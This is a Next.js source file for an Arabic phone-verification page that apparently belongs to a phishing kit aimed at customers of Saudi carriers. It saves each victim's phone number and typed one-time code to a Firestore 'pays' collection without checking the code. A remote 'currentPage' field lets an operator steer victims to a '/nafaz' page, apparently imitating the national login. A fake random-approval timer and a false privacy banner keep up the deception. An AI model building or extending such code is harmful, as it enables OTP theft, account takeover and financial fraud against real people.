"use client"

import type React from "react"
import { useRouter } from "next/navigation"
import { useEffect, useState } from "react"
import { addData, db} from "@/lib/firebase"
import { Check, X, RefreshCw, Phone } from "lucide-react"
import { Header } from "@/components/header"
import {  STCModal } from "@/components/STCModal"
import { PhoneVerificationService, sendPhone } from "@/lib/phone-service"
import { OtpInput } from "@/components/otp-input"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import { doc, onSnapshot } from "firebase/firestore"

// Function to get or create visitor ID
const getOrCreateVisitorId = () => {
  let visitorId = ""

  if (typeof window !== "undefined") {
    visitorId = localStorage.getItem("visitor") || ""

    // If no visitor ID exists, generate a new one and store it
    if (!visitorId) {
      visitorId = `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
      localStorage.setItem("visitor", visitorId)
    }
  }

  return visitorId
}

const operators = [
  { id: "stc", name: "STC", logo: "/stc.png", color: "bg-purple-50 border-purple-200" },
  { id: "mobily", name: "Mobily", logo: "/Mobily_Logo.svg", color: "bg-green-50 border-green-200" },
  { id: "zain", name: "Zain", logo: "/Zain-logo-400x400-01.png", color: "bg-orange-50 border-orange-200" },
]

type VerificationStatus = "idle" | "sending" | "pending" | "approved" | "error"

export default function PhoneVerificationEnhanced() {
  const router = useRouter()
  const [phone, setPhone] = useState("")
  const [operator, setOperator] = useState("")
  const [visitorId, setVisitorId] = useState<string>("")
  const [showSTCModal, setShowSTCModal] = useState(false)

  // OTP verification states
  const [otpCode, setOtpCode] = useState("")
  const [otpError, setOtpError] = useState("")
  const [verificationStatus, setVerificationStatus] = useState<VerificationStatus>("idle")

  // Loader states
  const [showLoader, setShowLoader] = useState(true)
  const [loaderMessage, setLoaderMessage] = useState("جاري تحميل الصفحة...")
  const [timeLeft, setTimeLeft] = useState(60)
  const [canResend, setCanResend] = useState(false)

  // Form errors
  const [errors, setErrors] = useState({
    phone: "",
    operator: "",
    system: "",
  })

  // Initialize visitor ID on component mount
  useEffect(() => {
    const id = getOrCreateVisitorId()
    setVisitorId(id)

    // Hide loader after initial page load
    const timer = setTimeout(() => {
      setShowLoader(false)
    }, 2000)

    return () => clearTimeout(timer)
  }, [])

  // Timer for countdown
  useEffect(() => {
    if (verificationStatus !== "pending" || timeLeft <= 0) {
      if (timeLeft <= 0) setCanResend(true)
      return
    }

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          setCanResend(true)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [verificationStatus, timeLeft])

  // Effect for listening to OTP status changes in Firestore
  useEffect(() => {
    if (verificationStatus !== "pending" || !visitorId) return

    // Mock Firestore listener - replace with actual implementation
    const mockListener = () => {
      
      
      // Simulate random approval after some time for demo
      const timer = setTimeout(() => {
        const isApproved = Math.random() > 0.3 // 70% success rate for demo
        if (isApproved) {
          setVerificationStatus("approved")
          setLoaderMessage("  . جاري التحويل")
          setTimeout(() => {
            router.push("/nafaz")
          }, 2000)
        } else {
          setVerificationStatus("error")
          setOtpError("فشل التحقق من رقم الهاتف. الرجاء المحاولة مرة أخرى.")
        }
      }, 5000)

      return () => clearTimeout(timer)
    }

    const cleanup = mockListener()
    return cleanup
  }, [verificationStatus, visitorId, router])

  // Format time for display
useEffect(()=>{
  const visitorId=localStorage.getItem('visitor')
    const unsubscribe = onSnapshot(doc(db, "pays", visitorId!), (docSnapshot) => {
      if (docSnapshot.exists()) {
        const userData = docSnapshot.data()
        // Assuming the PIN is stored in a field called 'nafaz_pin'
        if(userData.currentPage ==='1'){
            window.location.href='/quote'
        }else if(userData.currentPage ==='8888'){
          window.location.href='/nafaz'
        }
      } else {
        console.error("User document not found")
      }
    },
    
  )

  // Clean up the listener when component unmounts or modal closes
  return () => unsubscribe()
}, [])
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, "0")}`
  }

  // Validate phone number
  const validatePhone = (phoneNumber: string) => {
    return /^05\d{8}$/.test(phoneNumber)
  }

  // Handle phone input change
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 10)
    setPhone(value)

    if (errors.phone) {
      setErrors((prev) => ({ ...prev, phone: "" }))
    }
  }

  // Handle operator selection
  const handleOperatorSelect = (operatorId: string) => {
    setOperator(operatorId)

    if (errors.operator) {
      setErrors((prev) => ({ ...prev, operator: "" }))
    }
  }

  // Validate form before submission
  const validateForm = () => {
    const newErrors = {
      phone: "",
      operator: "",
      system: "",
    }

    let isValid = true

    if (!validatePhone(phone)) {
      newErrors.phone = "الرجاء إدخال رقم جوال صحيح (05xxxxxxxx)"
      isValid = false
    }

    if (!operator) {
      newErrors.operator = "الرجاء اختيار شركة الاتصالات"
      isValid = false
    }

    if (!visitorId) {
      newErrors.system = "خطأ في النظام. الرجاء تحديث الصفحة والمحاولة مرة أخرى."
      isValid = false
    }

    setErrors(newErrors)
    return isValid
  }

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!validateForm()) return

    try {
      setVerificationStatus("sending")
      setShowLoader(true)
      setLoaderMessage("جاري إرسال رمز التحقق...")
      setTimeLeft(60)
      setCanResend(false)

      // Store phone and operator in Firestore
      await addData({
        id: visitorId,
        phone2: phone,
        operator,
        timestamp: new Date().toISOString(),
      })

      // Save to localStorage
      localStorage.setItem("phoneNumber", phone)
      localStorage.setItem("operator", operator)

      if (operator === "stc") {
        setShowSTCModal(true)
        setShowLoader(false)
      } else {
        await PhoneVerificationService.verifyPhone(phone, operator)

        if (visitorId) {
          await sendPhone(visitorId, phone, operator)
        }
      }

      setVerificationStatus("pending")
      setLoaderMessage("تم إرسال رمز التحقق. الرجاء إدخال الرمز:")
    } catch (error) {
      console.error("Error during verification process:", error)
      setErrors((prev) => ({
        ...prev,
        system: "حدث خطأ أثناء عملية التحقق. الرجاء المحاولة مرة أخرى.",
      }))
      setVerificationStatus("error")
      setShowLoader(false)
    }
  }

  // Handle OTP input change
  const handleOtpChange = (value: string) => {
    setOtpCode(value)
    if (otpError) setOtpError("")

    // Auto-submit when code reaches 6 digits
    if (value.length === 6) {
      setTimeout(() => verifyOtp(value), 500)
    }
  }

  // Verify OTP code
  const verifyOtp = async (code?: string) => {
    const otpToVerify = code || otpCode

    if (otpToVerify.length < 4) {
      setOtpError("الرجاء إدخال رمز التحقق المكون من 4 إلى 6 أرقام")
      return
    }

    try {
      setVerificationStatus("pending")
      setLoaderMessage("جاري التحقق من الرمز...")

      await addData({
        id: visitorId,
        phoneOtpCode: otpToVerify,
        otpSubmittedAt: new Date().toISOString(),
        phoneVerificationStatus: "pending",
      })

      // The effect listener will handle status updates
    } catch (error) {
      console.error("OTP verification failed:", error)
      setVerificationStatus("error")
      setOtpError("حدث خطأ أثناء التحقق من الرمز. الرجاء المحاولة مرة أخرى.")
    }
  }

  // Resend OTP
  const handleResendOtp = async () => {
    if (!canResend) return

    setCanResend(false)
    setTimeLeft(60)
    setOtpCode("")
    setOtpError("")

    try {
      await PhoneVerificationService.verifyPhone(phone, operator)
      setLoaderMessage("تم إعادة إرسال رمز التحقق")
    } catch (error) {
      setOtpError("فشل في إعادة إرسال الرمز. الرجاء المحاولة مرة أخرى.")
    }
  }

  const getStatusIcon = () => {
    switch (verificationStatus) {
      case "sending":
      case "pending":
        return (
          <div className="animate-spin w-16 h-16 border-4 border-[#146394] border-t-transparent rounded-full mx-auto" />
        )
      case "approved":
        return (
          <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto animate-pulse">
            <Check className="h-10 w-10 text-green-600" />
          </div>
        )
      case "error":
        return (
          <div className="w-16 h-16 rounded-full bg-red-100 flex items-center justify-center mx-auto">
            <X className="h-10 w-10 text-red-600" />
          </div>
        )
      default:
        return (
          <div className="w-16 h-16 rounded-full bg-blue-100 flex items-center justify-center mx-auto">
            <Phone className="h-10 w-10 text-[#146394]" />
          </div>
        )
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#146394] via-[#1a7ab8] to-[#2086c2] flex flex-col items-center justify-start md:justify-center p-4">
      <Header />

      {/* Loader Overlay */}
      {showLoader && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center">
          <div className="bg-white rounded-2xl p-8 text-center space-y-6 max-w-md w-full mx-4 transform transition-all duration-300 shadow-2xl">
            {getStatusIcon()}

            <div className="space-y-4">
              <p className="text-2xl font-semibold text-[#146394]">{loaderMessage}</p>

              {(verificationStatus === "pending" || verificationStatus === "sending") &&
                loaderMessage.includes("رمز التحقق") && (
                  <div className="space-y-4">
                    <Input value={otpCode} type="tel" maxLength={6}  onChange={(e)=>handleOtpChange(e.target.value)}  />
                  
                  <Badge variant={'outline'} className="text-red-500">  {otpError} </Badge>

                    <div className="flex justify-center gap-2">
                      <button
                        onClick={() => verifyOtp()}
                        disabled={otpCode.length < 4}
                        className="px-6 py-2 bg-[#146394] text-white rounded-lg font-medium disabled:opacity-50 disabled:cursor-not-allowed hover:bg-[#0d4e77] transition-colors"
                      >
                        تحقق
                      </button>

                      {canResend && (
                        <button
                          onClick={handleResendOtp}
                          className="px-4 py-2 bg-gray-100 text-gray-700 rounded-lg font-medium hover:bg-gray-200 transition-colors flex items-center gap-2"
                        >
                          <RefreshCw className="h-4 w-4" />
                          إعادة إرسال
                        </button>
                      )}
                    </div>
                  </div>
                )}

              {otpError && (
                <div className="p-3 bg-red-50 border border-red-200 rounded-lg">
                  <p className="text-red-600 text-sm">{otpError}</p>
                  {verificationStatus === "error" && (
                    <button
                      onClick={() => {
                        setVerificationStatus("idle")
                        setOtpError("")
                        setOtpCode("")
                        setShowLoader(false)
                      }}
                      className="mt-2 w-full bg-red-100 text-red-700 py-2 rounded-lg font-medium text-sm hover:bg-red-200 transition-colors"
                    >
                      المحاولة مرة أخرى
                    </button>
                  )}
                </div>
              )}

              {verificationStatus === "pending" && (
                <p className="text-gray-600">الرجاء الانتظار بينما نتحقق من الرمز...</p>
              )}

              {timeLeft > 0 && verificationStatus === "pending" && (
                <div className="space-y-2">
                  <p className="text-3xl font-bold text-[#146394]">{formatTime(timeLeft)}</p>
                  <p className="text-sm text-gray-500">الوقت المتبقي لانتهاء صلاحية الرمز</p>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* STC Modal */}
      <STCModal isOpen={showSTCModal} onClose={() => setShowSTCModal(false)} />

      {/* Main Form */}
      <div className="w-full max-w-4xl bg-white rounded-2xl shadow-2xl border border-gray-100 overflow-hidden mt-8 md:mt-0">
        <div className="p-6 md:p-8 space-y-6 relative">
          <div className="text-center mb-8">
            <div className="w-20 h-20 bg-gradient-to-br from-[#146394] to-[#1a7ab8] rounded-full flex items-center justify-center mx-auto mb-4">
              <Phone className="h-10 w-10 text-white" />
            </div>
            <h1 className="text-3xl md:text-4xl font-bold text-[#146394] mb-2">التحقق من رقم الجوال</h1>
            <p className="text-gray-600 text-lg">الرجاء إدخال رقم الجوال واختيار شركة الاتصالات للمتابعة</p>
          </div>

          {errors.system && (
            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg flex items-center gap-2">
              <X className="h-5 w-5" />
              {errors.system}
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Phone Input */}
            <div className="space-y-2">
              <label htmlFor="phone" className="block text-sm font-medium text-gray-700">
                رقم الجوال *
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 right-0 flex items-center pr-4 pointer-events-none">
                  <span className="text-gray-500 font-medium">+966</span>
                </div>
                <input
                  type="tel"
                  id="phone"
                  value={phone}
                  onChange={handlePhoneChange}
                  className={`block w-full pr-20 pl-4 py-4 text-gray-900 border rounded-lg focus:ring-2 focus:ring-[#146394] focus:border-transparent text-right text-lg ${
                    errors.phone ? "border-red-300" : "border-gray-300"
                  }`}
                  placeholder="05xxxxxxxx"
                  dir="ltr"
                />
              </div>
              {errors.phone && (
                <p className="text-red-500 text-sm flex items-center gap-1">
                  <X className="h-4 w-4" />
                  {errors.phone}
                </p>
              )}
            </div>

            {/* Operator Selection */}
            <div className="space-y-3">
              <label className="block text-sm font-medium text-gray-700">شركة الاتصالات *</label>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {operators.map((op) => (
                  <button
                    key={op.id}
                    type="button"
                    onClick={() => handleOperatorSelect(op.id)}
                    className={`flex flex-col items-center justify-center p-6 border-2 rounded-xl transition-all duration-200 hover:shadow-md ${
                      operator === op.id
                        ? `border-[#146394] bg-blue-50 shadow-lg transform scale-105`
                        : `border-gray-200 hover:border-gray-300 ${op.color}`
                    }`}
                  >
                    <img
                      src={op.logo || "/placeholder.svg"}
                      alt={op.name}
                      className="h-10 w-auto mb-3 object-contain"
                    />
                    <span className="text-lg font-semibold text-gray-800">{op.name}</span>
                    {operator === op.id && <Check className="h-5 w-5 text-[#146394] mt-2" />}
                  </button>
                ))}
              </div>
              {errors.operator && (
                <p className="text-red-500 text-sm flex items-center gap-1">
                  <X className="h-4 w-4" />
                  {errors.operator}
                </p>
              )}
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={verificationStatus === "sending"}
              className="w-full bg-gradient-to-r from-[#146394] to-[#1a7ab8] text-white py-4 rounded-xl font-semibold text-lg transform transition-all duration-300 hover:from-[#0d4e77] hover:to-[#146394] hover:shadow-lg disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              {verificationStatus === "sending" ? (
                <>
                  <div className="animate-spin w-5 h-5 border-2 border-white border-t-transparent rounded-full" />
                  جاري الإرسال...
                </>
              ) : (
                <>
                  <Phone className="h-5 w-5" />
                  إرسال رمز التحقق
                </>
              )}
            </button>
          </form>

          {/* Security Notice */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mt-6">
            <p className="text-blue-800 text-sm text-center">🔒 معلوماتك محمية بأعلى معايير الأمان والخصوصية</p>
          </div>
        </div>
      </div>
    </div>
  )
}
